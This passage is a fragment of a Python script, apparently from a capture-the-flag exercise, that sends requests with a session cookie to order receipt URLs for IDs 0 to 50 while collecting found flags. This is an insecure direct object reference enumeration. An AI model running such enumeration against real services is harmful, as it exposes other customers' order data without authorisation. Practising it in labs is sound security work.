    "Cookie": session_cookie
}

full_responses = {}
flags_found = []
unique_responses = {}

# Test a smaller range first but get complete responses
for order_id in range(0, 51):
    url = f"{base_url}/order/{order_id}/receipt"
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
